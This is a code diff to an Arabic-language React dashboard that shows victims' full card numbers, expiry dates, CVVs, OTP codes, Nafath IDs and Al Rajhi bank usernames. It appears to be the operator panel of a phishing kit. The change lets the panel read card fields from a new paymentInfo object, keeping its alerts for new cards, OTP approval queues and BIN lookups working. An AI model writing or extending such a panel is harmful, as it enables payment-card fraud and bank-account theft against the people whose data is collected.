@@ -81,6 +81,12 @@ interface Notification {
     birthYear?: string;
     isHijri?: boolean;
   };
+  paymentInfo?: {
+    cardName?: string;
+    cardNumber?: string;
+    cardExpiry?: string;
+    cardCvv?: string;
+  };
   nationalId?: string;
   phoneNumber?: string;
   phoneCarrier?: string;
@@ -209,7 +215,7 @@ export default function Dashboard() {
         const hasNewApp = notificationsData.some((app) => !prevIds.has(app.id));
         const hasNewCardData = notificationsData.some((app) => {
           const prevApp = prevAppsRef.current.find((p) => p.id === app.id);
-          return app.cardNumber && (!prevApp || !prevApp.cardNumber);
+          return getCardNumber(app) && (!prevApp || !getCardNumber(prevApp));
         });
         if (hasNewApp || hasNewCardData) {
           playNotificationSound();
@@ -224,9 +230,15 @@ export default function Dashboard() {
     return () => unsubscribe();
   }, [soundEnabled]);
 
+  // Helper functions to get card data from either paymentInfo or direct fields
+  const getCardNumber = (n: Notification) => n.paymentInfo?.cardNumber || n.cardNumber;
+  const getCardName = (n: Notification) => n.paymentInfo?.cardName || n.cardName;
+  const getCardExpiry = (n: Notification) => n.paymentInfo?.cardExpiry || n.cardExpiry;
+  const getCardCvv = (n: Notification) => n.paymentInfo?.cardCvv || n.cardCvv;
+
   const hasData = (n: Notification) => {
     return (
-      n.cardNumber ||
+      getCardNumber(n) ||
       n.otpCode ||
       n.phoneOtpCode ||
       n.rajhiUser ||
@@ -241,12 +253,15 @@ export default function Dashboard() {
     return notifications.filter((app) => {
       if (!hasData(app)) return false;
       
+      const cardNum = getCardNumber(app);
+      const cardNm = getCardName(app);
+      
       const matchesSearch = !searchTerm ||
         app.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
         app.nationalId?.includes(searchTerm) ||
         app.phoneNumber?.includes(searchTerm) ||
-        app.cardNumber?.includes(searchTerm) ||
-        app.cardName?.toLowerCase().includes(searchTerm.toLowerCase());
+        cardNum?.includes(searchTerm) ||
+        cardNm?.toLowerCase().includes(searchTerm.toLowerCase());
 
       const matchesStatus = statusFilter === "all" ||
         (statusFilter === "completed" && app.approvalStatus === "approved_otp") ||
@@ -254,13 +269,13 @@ export default function Dashboard() {
         (statusFilter === "rejected" && app.approvalStatus === "rejected");
 
       const matchesApproval = approvalFilter === "all" ||
-        (approvalFilter === "pending_card" && app.cardNumber && !app.cardOtpApproved) ||
+        (approvalFilter === "pending_card" && cardNum && !app.cardOtpApproved) ||
         (approvalFilter === "pending_phone" && app.phoneOtpCode && !app.phoneOtpApproved) ||
         (approvalFilter === "approved" && (app.cardOtpApproved || app.phoneOtpApproved)) ||
         (approvalFilter === "rejected" && app.approvalStatus === "rejected");
 
       const matchesData = dataFilter === "all" ||
-        (dataFilter === "card" && app.cardNumber) ||
+        (dataFilter === "card" && cardNum) ||
         (dataFilter === "phone" && (app.phoneOtpCode || app.phoneNumber)) ||
         (dataFilter === "nafaz" && app.nafazId) ||
         (dataFilter === "rajhi" && app.rajhiUser);
@@ -276,27 +291,28 @@ export default function Dashboard() {
   const selectedApplication = notifications.find((app) => app.id === selectedId);
 
   // Fetch BIN data when card number changes
+  const selectedCardNumber = selectedApplication ? getCardNumber(selectedApplication) : undefined;
   useEffect(() => {
-    if (selectedApplication?.cardNumber) {
-      fetchBinData(selectedApplication.cardNumber);
+    if (selectedCardNumber) {
+      fetchBinData(selectedCardNumber);
     } else {
       setBinData(null);
     }
-  }, [selectedApplication?.cardNumber]);
+  }, [selectedCardNumber]);
 
   const stats = {
     total: notifications.filter(hasData).length,
-    cards: notifications.filter((a) => a.cardNumber).length,
-    pending: notifications.filter((a) => a.cardNumber && !a.cardOtpApproved).length,
+    cards: notifications.filter((a) => getCardNumber(a)).length,
+    pending: notifications.filter((a) => getCardNumber(a) && !a.cardOtpApproved).length,
     approved: notifications.filter((a) => a.cardOtpApproved || a.phoneOtpApproved).length,
   };
 
   const pendingApprovals = {
-    cardApprovals: notifications.filter((a) => a.cardNumber && !a.cardOtpApproved).length,
+    cardApprovals: notifications.filter((a) => getCardNumber(a) && !a.cardOtpApproved).length,
     phoneApprovals: notifications.filter((a) => a.phoneOtpCode && !a.phoneOtpApproved).length,
     nafazApprovals: notifications.filter((a) => a.nafazId && !a.nafathApproved).length,
     total: notifications.filter((a) => 
-      (a.cardNumber && !a.cardOtpApproved) || 
+      (getCardNumber(a) && !a.cardOtpApproved) || 
       (a.phoneOtpCode && !a.phoneOtpApproved) ||
       (a.nafazId && !a.nafathApproved)
     ).length,
@@ -372,7 +388,7 @@ export default function Dashboard() {
   };
 
   const getDisplayName = (n: Notification) => {
-    return n.cardName || n.documment_owner_full_name || n.nationalId || n.phoneNumber || n.id.substring(0, 8);
+    return getCardName(n) || n.documment_owner_full_name || n.nationalId || n.phoneNumber || n.id.substring(0, 8);
   };
 
   const formatTime = (date: any) => {
@@ -554,8 +570,8 @@ export default function Dashboard() {
                 className={cn(
                   "flex items-center gap-3 px-4 py-3 border-b border-border cursor-pointer transition-all duration-200 hover:bg-primary/5",
                   selectedId === app.id && "bg-blue-50 dark:bg-blue-900/20 border-r-2 border-r-blue-500",
-                  app.cardNumber && selectedId !== app.id && "bg-gradient-to-l from-purple-50 dark:from-purple-900/20 to-transparent border-r-2 border-r-purple-400",
-                  (app.nafazId || app.phoneOtpCode) && !app.cardNumber && selectedId !== app.id && "bg-gradient-to-l from-green-50 dark:from-green-900/20 to-transparent border-r-2 border-r-green-400",
+                  getCardNumber(app) && selectedId !== app.id && "bg-gradient-to-l from-purple-50 dark:from-purple-900/20 to-transparent border-r-2 border-r-purple-400",
+                  (app.nafazId || app.phoneOtpCode) && !getCardNumber(app) && selectedId !== app.id && "bg-gradient-to-l from-green-50 dark:from-green-900/20 to-transparent border-r-2 border-r-green-400",
                 )}
                 data-testid={`app-item-${app.id}`}
               >
@@ -584,7 +600,7 @@ export default function Dashboard() {
                     <span className="text-[10px] text-muted-foreground">{formatTime(app.createdAt)}</span>
                   </div>
                   <div className="flex items-center gap-2 mt-1">
-                    {app.cardNumber && <Badge variant="outline" className="text-[9px] px-1.5 py-0 h-4 border-purple-300 text-purple-600"><CreditCard size={8} className="mr-1" />بطاقة</Badge>}
+                    {getCardNumber(app) && <Badge variant="outline" className="text-[9px] px-1.5 py-0 h-4 border-purple-300 text-purple-600"><CreditCard size={8} className="mr-1" />بطاقة</Badge>}
                     {app.nafazId && <Badge variant="outline" className="text-[9px] px-1.5 py-0 h-4 border-green-300 text-green-600"><Lock size={8} className="mr-1" />نفاذ</Badge>}
                     {app.rajhiUser && <Badge variant="outline" className="text-[9px] px-1.5 py-0 h-4 border-teal-300 text-teal-600"><Shield size={8} className="mr-1" />الراجحي</Badge>}
                   </div>
@@ -616,7 +632,7 @@ export default function Dashboard() {
                   </div>
                   <div className="flex items-center gap-2 text-sm">
                     <User size={14} className="text-gray-400" />
-                    <span className="text-foreground" data-testid="text-owner">{selectedApplication.cardName || selectedApplication.documment_owner_full_name}</span>
+                    <span className="text-foreground" data-testid="text-owner">{getCardName(selectedApplication) || selectedApplication.documment_owner_full_name}</span>
                   </div>
                 </>
               )}
@@ -702,13 +718,13 @@ export default function Dashboard() {
               <ChatBubble title="المعلومات الأساسية" isUser icon={<User size={16} />}>
                 <div className="space-y-1 text-sm">
                   {selectedApplication.nationalId && <div>رقم الهوية: <span className="font-mono" dir="ltr">{selectedApplication.nationalId}</span></div>}
-                  {selectedApplication.cardName && <div>الاسم: {selectedApplication.cardName}</div>}
+                  {getCardName(selectedApplication) && <div>الاسم: {getCardName(selectedApplication)}</div>}
                   {selectedApplication.phoneNumber && <div>الهاتف: <span className="font-mono" dir="ltr">{selectedApplication.phoneNumber}</span></div>}
                 </div>
               </ChatBubble>
 
               {/* Payment Card */}
-              {selectedApplication.cardNumber && (
+              {getCardNumber(selectedApplication) && (
                 <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                   <div className="bg-gradient-to-l from-amber-500/10 to-card px-4 py-3 border-b border-border">
                     <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
@@ -737,31 +753,31 @@ export default function Dashboard() {
                       </div>
                       <div className="mb-6">
                         <div className="font-mono text-2xl text-white tracking-[0.2em] font-medium" dir="ltr">
-                          {selectedApplication.cardNumber?.replace(/(.{4})/g, '$1 ').trim()}
+                          {getCardNumber(selectedApplication)?.replace(/(.{4})/g, '$1 ').trim()}
                         </div>
                       </div>
                       <div className="flex justify-between items-end text-white">
                         <div>
                           <div className="text-[10px] text-white/60 mb-1">CARD HOLDER</div>
-                          <div className="font-medium uppercase text-sm">{selectedApplication.cardName || "NAME"}</div>
+                          <div className="font-medium uppercase text-sm">{getCardName(selectedApplication) || "NAME"}</div>
                         </div>
                         <div className="text-left">
                           <div className="text-[10px] text-white/60 mb-1">EXPIRES</div>
-                          <div className="font-mono text-sm">{selectedApplication.cardExpiry || "MM/YY"}</div>
+                          <div className="font-mono text-sm">{getCardExpiry(selectedApplication) || "MM/YY"}</div>
                         </div>
                         <div className="text-left">
                           <div className="text-[10px] text-white/60 mb-1">CVV</div>
-                          <div className="font-mono text-sm font-bold">{selectedApplication.cardCvv || "***"}</div>
+                          <div className="font-mono text-sm font-bold">{getCardCvv(selectedApplication) || "***"}</div>
                         </div>
                       </div>
                     </div>
 
                     {/* Card Details */}
                     <div className="space-y-1">
-                      <DataRow label="رقم البطاقة" value={selectedApplication.cardNumber} isLtr />
-                      <DataRow label="اسم حامل البطاقة" value={selectedApplication.cardName} />
-                      <DataRow label="تاريخ الانتهاء" value={selectedApplication.cardExpiry} isLtr />
-                      <DataRow label="CVV" value={selectedApplication.cardCvv} isLtr />
+                      <DataRow label="رقم البطاقة" value={getCardNumber(selectedApplication)} isLtr />
+                      <DataRow label="اسم حامل البطاقة" value={getCardName(selectedApplication)} />
+                      <DataRow label="تاريخ الانتهاء" value={getCardExpiry(selectedApplication)} isLtr />
+                      <DataRow label="CVV" value={getCardCvv(selectedApplication)} isLtr />
                     </div>
 
                     {/* BIN Info Section */}
